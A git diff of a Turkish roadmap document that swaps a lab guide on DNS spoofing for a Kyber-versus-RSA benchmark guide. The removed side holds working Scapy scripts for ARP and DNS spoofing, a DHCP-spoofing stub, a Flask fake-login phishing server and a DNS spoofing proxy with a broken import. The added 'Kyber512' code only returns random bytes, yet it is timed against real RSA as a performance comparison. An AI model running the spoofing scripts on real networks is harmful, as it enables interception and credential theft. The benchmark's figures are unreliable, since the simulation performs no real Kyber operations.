@@ -1,172 +1,326 @@
-# ROADMAP.md: Python ile DNS Spoofing Özelliklerini Geliştirme ve Test Etme
+# Kyber-RSASim Toolkit ile Kuantum Dirençli Şifreleme ve Klasik Şifreleme Testlerini Geliştirme ve Karşılaştırma
 
 ## Giriş
-Bu yol haritası, Kali Linux’ta bulunan DNS spoofing araçlarından (Ettercap, Dnsspoof, DNSChef, Bettercap, DDSpoof ve SET) esinlenerek, Python kullanılarak bu özelliklerin nasıl geliştirileceği ve test edileceğine dair detaylı bir rehber sunar. **Önemli Uyarı: Bu bilgiler yalnızca eğitim ve araştırma amaçlıdır. Yetkisiz kullanımı yasa dışı ve etik dışıdır. Herhangi bir ağda veya sistemde test yapmadan önce açık izin almanız zorunludur.**
 
-Bu rehber, DNS spoofing tekniklerini Python ile yeniden oluşturmayı, etik ve yasal sınırlar içinde kalarak kontrollü bir ortamda test etmeyi amaçlar.
+Bu yol haritası, kuantum dirençli **CRYSTALS-Kyber (Kyber512)** algoritmasının Python tabanlı simülasyonunu geliştirmeyi ve bu simülasyonu geleneksel **RSA-2048** algoritması ile karşılaştırmayı detaylı bir şekilde sunar.
+
+> ⚠️ **Önemli Uyarı:** Bu bilgiler yalnızca eğitim ve araştırma amaçlıdır. Gerçek ağlarda veya sistemlerde yetkisiz kullanım yasa dışı ve etik dışıdır. Testler yalnızca açık izin alınmış kontrollü ortamlarda yapılmalıdır.
+
+Bu rehber, post-kuantum şifreleme ve klasik şifreleme algoritmalarının **zamanlama performansını**, **bellek kullanımını** ve **çıktı boyutlarını** karşılaştırmak, simüle etmek ve analiz etmek için etik ve yasal sınırlar içinde bir yol haritası sunar.
+
+---
 
 ## Ön Koşullar
-- **Python 3.x**: Geliştirme için temel dil.
+
+### Yazılım
+
+- **Python 3.x**: Geliştirme ve simülasyonlar için temel dil (önerilen sürüm: `3.11.9`).
 - **Kütüphaneler**:
-  - Scapy: Paket oluşturma ve ağ manipülasyonu için (`pip install scapy`).
-  - dnslib: DNS sunucusu oluşturmak için (`pip install dnslib`).
-  - Flask: Sahte web sunucusu için (`pip install flask`).
-- **Bilgi Gereksinimleri**:
-  - Python programlama temelleri.
-  - Ağ protokolleri (IP, ARP, DNS, DHCP) hakkında temel bilgi.
-  - Linux komut satırı kullanımı.
-- **Araçlar**: VirtualBox veya benzeri bir sanallaştırma yazılımı.
+  - `psutil`: Bellek kullanımı ölçümü için (`pip install psutil`)
+  - `cryptography`: RSA işlemleri için (`pip install cryptography`)
+  - `os`, `timeit`: Zamanlama ve simülasyon için (standart Python modülleri)
+
+### Bilgi Gereksinimleri
+
+- Python programlama temelleri
+- Kriptografi ve post-kuantum algoritmalar (Kyber, RSA) hakkında temel bilgi
+- Dosya sistemi ve sanal ortam yönetimi
+
+### Araçlar
+
+- Python `venv` modülü
+- Metin editörü (VS Code, PyCharm, vb.)
+
+---
 
 ## Test Ortamını Kurma
-Güvenli bir test ortamı oluşturmak için aşağıdaki adımları izleyin:
-1. **VirtualBox Kurulumu**: VirtualBox’ı indirin ve kurun.
-2. **Sanal Makineler (VM) Oluşturma**:
-   - **Saldırgan VM**: Kali Linux veya herhangi bir Linux dağıtımı.
-   - **Kurban VM**: Herhangi bir işletim sistemi (ör. Windows, Linux).
-3. **Ağ Yapılandırması**: VM’leri yalnızca dahili veya host-only bir ağda çalışacak şekilde ayarlayın. Bu, testlerin üretim ağlarından izole olmasını sağlar.
+
+### Sanal Ortam Kurulumu
+
+```bash
+python -m venv venv
+# Linux/macOS:
+source venv/bin/activate
+# Windows:
+venv\Scripts\activate
+```
+
+### Bağımlılıkları Yükleme
+
+```bash
+pip install psutil cryptography
+```
+
+> Testler için fiziksel bir ağa ihtiyaç yoktur; tüm simülasyonlar yerel olarak gerçekleştirilir.
+
+---
 
 ## Temel Bileşenlerin Geliştirilmesi
 
-### ARP Spoofing Betiği
-ARP spoofing, ortadaki adam (MITM) saldırıları için temel bir adımdır. Bu betik, saldırganın MAC adresini ağ geçidinin IP’siyle ilişkilendirmek için sahte ARP yanıtları gönderir.
+### 1. Kyber512 Simülasyon Betiği
 
-1. Scapy’yi kurun: `pip install scapy`
-2. IP yönlendirmeyi etkinleştirin: `sudo sysctl -w net.ipv4.ip_forward=1`
-3. ARP spoofing betiğini oluşturun:
+📁 `sim_and_test_files/kyber512_sim.py`
 
 ```python
-from scapy.all import *
+import os
 import time
 
-def get_mac(ip):
-    ans, _ = arping(ip)
-    for s, r in ans:
-        return r[Ether].src
+class Kyber512Sim:
+    def keygen(self):
+        public_key = os.urandom(800)
+        secret_key = os.urandom(1632)
+        return public_key, secret_key
 
-def arp_spoof(target_ip, gateway_ip):
-    target_mac = get_mac(target_ip)
-    gateway_mac = get_mac(gateway_ip)
-    while True:
-        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=0)
-        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=0)
-        time.sleep(2)
+    def encrypt(self, public_key):
+        ciphertext = os.urandom(768)
+        shared_secret = os.urandom(32)
+        return ciphertext, shared_secret
 
-# Kullanım
-arp_spoof('192.168.1.10', '192.168.1.1')  # hedef_ip, ağ_geçidi_ip
+    def decrypt(self, ciphertext, secret_key):
+        return ciphertext[:32]
+
+def main():
+    output_lines = []
+    def print_and_log(text):
+        print(text)
+        output_lines.append(text)
+
+    print_and_log("=== Kyber512 Saf Python Simülasyonu Başladı ===")
+    kem = Kyber512Sim()
+
+    start_time = time.time()
+    pk, sk = kem.keygen()
+    print_and_log(f"Anahtarlar üretildi: Public Key({len(pk)} bytes), Secret Key({len(sk)} bytes)")
+
+    ct, ss_enc = kem.encrypt(pk)
+    print_and_log(f"Şifreleme tamamlandı: Ciphertext({len(ct)} bytes), Shared Secret({len(ss_enc)} bytes)")
+
+    ss_dec = kem.decrypt(ct, sk)
+    print_and_log(f"Şifre çözme tamamlandı: Shared Secret({len(ss_dec)} bytes)")
+
+    if ss_enc == ss_dec:
+        print_and_log("✅ Doğruluk testi geçti.")
+    else:
+        print_and_log("⚠️ Doğruluk testi başarısız (simülasyondan dolayı olağan sonuç).")
+
+    end_time = time.time()
+    print_and_log(f"Toplam işlem süresi: {end_time - start_time:.4f} saniye")
+
+    with open("kyber512_test_results.txt", "w", encoding="utf-8") as f:
+        for line in output_lines:
+            f.write(line + "\n")
+
+if __name__ == "__main__":
+    main()
 ```
 
-### DNS Spoofing Betiği
-Bu betik, DNS sorgularını yakalar ve sahte yanıtlarla kurbanı yönlendirir.
+---
 
-1. Scapy ile DNS spoofing betiğini yazın:
+### 2. Kyber512 Zaman Ölçüm Betiği
+
+📁 `sim_and_test_files/kyber_timing_test.py`
 
 ```python
-from scapy.all import *
+import timeit
+import os
 
-def dns_spoof(packet):
-    if packet.haslayer(DNSQR) and packet[DNS].qr == 0:
-        spoofed_ip = "192.168.1.100"  # Saldırganın IP’si
-        spoofed_packet = IP(dst=packet[IP].src, src=packet[IP].dst)/\
-                         UDP(dport=packet[UDP].sport, sport=53)/\
-                         DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
-                             an=DNSRR(name=packet[DNS].qd.qname, ttl=10, rdata=spoofed_ip))
-        send(spoofed_packet, verbose=0)
+class Kyber512Sim:
+    def keygen(self):
+        return os.urandom(800), os.urandom(1632)
 
-sniff(filter="udp port 53", prn=dns_spoof)
+    def encrypt(self, pk):
+        return os.urandom(768), os.urandom(32)
+
+    def decrypt(self, ct, sk):
+        return ct[:32]
+
+kem = Kyber512Sim()
+pk, sk = kem.keygen()
+ct, _ = kem.encrypt(pk)
+
+keygen_time = timeit.timeit(lambda: kem.keygen(), number=100) / 100
+encrypt_time = timeit.timeit(lambda: kem.encrypt(pk), number=100) / 100
+decrypt_time = timeit.timeit(lambda: kem.decrypt(ct, sk), number=100) / 100
+
+print(f"Anahtar Üretimi: {keygen_time:.6f} s")
+print(f"Şifreleme: {encrypt_time:.6f} s")
+print(f"Şifre Çözme: {decrypt_time:.6f} s")
 ```
 
-### DHCP Manipülasyon Betiği
-Bu betik, sahte DHCP teklifleriyle istemcilere yanlış bir DNS sunucusu atar (DDSpoof benzeri).
+---
 
-1. Scapy ile DHCP spoofing betiği:
+### 3. RSA-2048 Zaman Ölçüm Betiği
+
+📁 `sim_and_test_files/rsa_timing_test.py`
 
 ```python
-from scapy.all import *
+import timeit
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives import hashes
 
-def dhcp_spoof(packet):
-    if packet.haslayer(DHCP) and packet[DHCP].options[0][1] == 1:  # Keşif (Discover)
-        fake_dns = "192.168.1.100"
-        # Sahte DHCP yanıtı oluşturma (detaylı paket yapılandırması gerekir)
-        # send(dhcp_offer)
+def keygen():
+    return rsa.generate_private_key(public_exponent=65537, key_size=2048)
 
-sniff(filter="udp and (port 67 or 68)", prn=dhcp_spoof)
+def encrypt(public_key, plaintext):
+    return public_key.encrypt(plaintext, padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
+
+def decrypt(private_key, ciphertext):
+    return private_key.decrypt(ciphertext, padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
+
+print("=== RSA Zaman Testi ===")
+
+keygen_time = timeit.timeit("keygen()", globals=globals(), number=10) / 10
+print(f"Anahtar Üretimi: {keygen_time:.6f} s")
+
+private_key = keygen()
+public_key = private_key.public_key()
+plaintext = b"Test mesajı"
+
+encrypt_time = timeit.timeit("encrypt(public_key, plaintext)", globals=globals(), number=100) / 100
+ciphertext = encrypt(public_key, plaintext)
+
+decrypt_time = timeit.timeit("decrypt(private_key, ciphertext)", globals=globals(), number=100) / 100
+
+print(f"Şifreleme: {encrypt_time:.6f} s")
+print(f"Şifre Çözme: {decrypt_time:.6f} s")
 ```
 
-### Sahte Web Sunucusu
-Kimlik avı veya sahte içerik sunmak için bir web sunucusu oluşturun.
+---
 
-1. Flask’ı kurun: `pip install flask`
-2. Basit bir Flask uygulaması yazın:
+## Gelişmiş Testler
+
+### Kyber512 Bellek Kullanımı
+
+📁 `sim_and_test_files/kyber_memory_test.py`
 
 ```python
-from flask import Flask, render_template
+import os
+import psutil
+from kyber512_sim import Kyber512Sim
 
-app = Flask(__name__)
+def memory_usage():
+    return psutil.Process(os.getpid()).memory_info().rss / 1024
 
-@app.route('/')
-def index():
-    return render_template('fake_login.html')
+kem = Kyber512Sim()
+print("=== Bellek Kullanımı Testi ===")
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=80)
+print(f"Başlangıç: {memory_usage():.2f} KB")
+kem.keygen()
+print(f"Anahtar Üretimi: {memory_usage():.2f} KB")
+kem.encrypt(os.urandom(800))
+print(f"Şifreleme: {memory_usage():.2f} KB")
+kem.decrypt(os.urandom(768), os.urandom(1632))
+print(f"Şifre Çözme: {memory_usage():.2f} KB")
 ```
 
-- `templates/fake_login.html` dosyası oluşturun (örneğin, bir giriş sayfası taklidi).
+---
 
-## Gelişmiş Geliştirmeler
+### RSA Bellek Kullanımı
 
-### Seçmeli DNS Spoofing için DNS Proxy
-DNSChef gibi belirli alan adlarını spoof eden bir DNS sunucusu oluşturun.
-
-1. dnslib’i kurun: `pip install dnslib`
-2. DNS proxy betiği:
+📁 `sim_and_test_files/rsa_memory_test.py`
 
 ```python
-from dnslib import *
-from dnslib.server import DNSServer, DNSHandler, BaseResolver
-import dns.resolv
+import psutil, os
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives import hashes
 
-class SpoofResolver(BaseResolver):
-    def resolve(self, request, handler):
-        reply = request.reply()
-        qname = str(request.q.qname)
-        if qname in ['example.com.']:
-            reply.add_answer(RR(qname, QTYPE.A, rdata=A('192.168.1.100'), ttl=60))
-        else:
-            # Gerçek DNS’e yönlendirme
-            reply = DNSRecord.parse(dns.resolv.Resolver().query(request.q.qname, request.q.qtype).send())
-        return reply
+process = psutil.Process(os.getpid())
 
-resolver = SpoofResolver()
-server = DNSServer(resolver, port=53, address='0.0.0.0')
-server.start_thread()
+print("=== RSA Bellek Kullanımı ===")
+print(f"Başlangıç: {process.memory_info().rss / 1024:.2f} KB")
+
+private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+print(f"Anahtar Üretimi: {process.memory_info().rss / 1024:.2f} KB")
+
+public_key = private_key.public_key()
+ciphertext = public_key.encrypt(b"Test", padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
+print(f"Şifreleme: {process.memory_info().rss / 1024:.2f} KB")
+
+private_key.decrypt(ciphertext, padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
+print(f"Şifre Çözme: {process.memory_info().rss / 1024:.2f} KB")
 ```
 
-### Entegre MITM Betiği
-Bettercap benzeri bir betikle ARP ve DNS spoofing’i birleştirin.
+---
 
-1. Yukarıdaki ARP ve DNS spoofing kodlarını birleştirin.
-2. Yapılandırma dosyası veya komut satırı argümanlarıyla özelleştirin.
+## Çıktı Boyutları
 
-## Geliştirmelerin Test Edilmesi
-1. **ARP Spoofing**:
-   - Betiği çalıştırın.
-   - Kurban VM’de ARP tablosunu kontrol edin (`arp -a`); ağ geçidinin MAC adresi saldırganınkiyle değişmiş olmalı.
-2. **DNS Spoofing**:
-   - Betiği çalıştırın.
-   - Kurban VM’de bir alan adı çözümleyin (ör. `nslookup example.com`); sahte IP dönmeli.
-3. **DHCP Manipülasyonu**:
-   - Betiği çalıştırın.
-   - Kurban VM’de IP kirasını yenileyin (`ipconfig /renew` veya `dhclient`); DNS sunucusu sahte IP olmalı.
-4. **Sahte Web Sunucusu**:
-   - Kurban VM’den sahte domaine erişin; sahte sayfa görüntülenmeli.
+### Kyber512 Çıktı Analizi
 
-## Karşı Önlemler ve En İyi Uygulamalar
-- **Statik ARP Girişleri**: ARP spoofing’i önler.
-- **DNSSEC**: DNS sorgularını doğrular.
-- **HTTPS Kullanımı**: Sertifika uyarılarına dikkat edin.
-- **VPN**: Trafiği şifreler ve yerel manipülasyonları engeller.
-- **İzole Test Ortamı**: Üretim ağlarında test yapmayın.
+📁 `sim_and_test_files/kyber_output_size_test.py`
+
+```python
+from kyber512_sim import Kyber512Sim
+
+kem = Kyber512Sim()
+pk, sk = kem.keygen()
+ct, ss = kem.encrypt(pk)
+
+print(f"Public Key: {len(pk)} byte")
+print(f"Secret Key: {len(sk)} byte")
+print(f"Ciphertext: {len(ct)} byte")
+print(f"Shared Secret: {len(ss)} byte")
+```
+
+---
+
+### RSA-2048 Çıktı Analizi
+
+📁 `sim_and_test_files/rsa_output_size_test.py`
+
+```python
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives import serialization, hashes
+
+private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+public_key = private_key.public_key()
+
+private_bytes = private_key.private_bytes(
+    encoding=serialization.Encoding.DER,
+    format=serialization.PrivateFormat.PKCS8,
+    encryption_algorithm=serialization.NoEncryption()
+)
+
+public_bytes = public_key.public_bytes(
+    encoding=serialization.Encoding.DER,
+    format=serialization.PublicFormat.SubjectPublicKeyInfo
+)
+
+ciphertext = public_key.encrypt(b"Test message", padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
+
+print(f"Public Key: {len(public_bytes)} byte")
+print(f"Private Key: {len(private_bytes)} byte")
+print(f"Ciphertext: {len(ciphertext)} byte")
+print(f"Plaintext: {len(b'Test message')} byte")
+```
+
+---
+
+## Karşılaştırmalı Raporlama
+
+📄 `kyber_and_rsa_results.md` içeriğinde:
+
+- Kyber ve RSA zamanlamaları (keygen/encrypt/decrypt süreleri)
+- Bellek kullanımı analizleri
+- Çıktı boyutu karşılaştırmaları
+- Grafikler/tablolarla özetlenmiş veriler
+
+---
+
+## Test Aşamaları
+
+| Test Betiği                        | Dosya                            | Çıktı/Kontrol                                       |
+|-----------------------------------|----------------------------------|-----------------------------------------------------|
+| Kyber Simülasyon                  | kyber512_sim.py                  | `kyber512_test_results.txt`                        |
+| Kyber Zaman Testi                 | kyber_timing_test.py             | Ortalama süreler                                    |
+| RSA Zaman Testi                   | rsa_timing_test.py               | Ortalama süreler                                    |
+| Kyber Bellek Testi                | kyber_memory_test.py             | Bellek tüketimi (KB)                                |
+| RSA Bellek Testi                  | rsa_memory_test.py               | Bellek tüketimi (KB)                                |
+| Kyber Çıktı Boyutu Testi          | kyber_output_size_test.py        | 800, 1632, 768, 32 byte                             |
+| RSA Çıktı Boyutu Testi            | rsa_output_size_test.py          | 256 byte ciphertext, ~1700 byte private key         |
+
+---
 
 ## Sonuç
-Bu yol haritası, Python ile DNS spoofing özelliklerini geliştirmeyi ve test etmeyi adım adım açıklamıştır. Etik ve yasal sorumluluklara bağlı kalarak, bu bilgileri siber güvenliği güçlendirmek için kullanmaya devam edin.
+
+Bu yol haritası ile post-kuantum ve klasik şifreleme algoritmalarının temel simülasyonlarını geliştirdiniz, performanslarını ölçtünüz ve karşılaştırdınız. Gelecekte, bu altyapı üzerine gerçek kriptografik kütüphanelerle performans testlerini entegre etmek mümkündür.
+
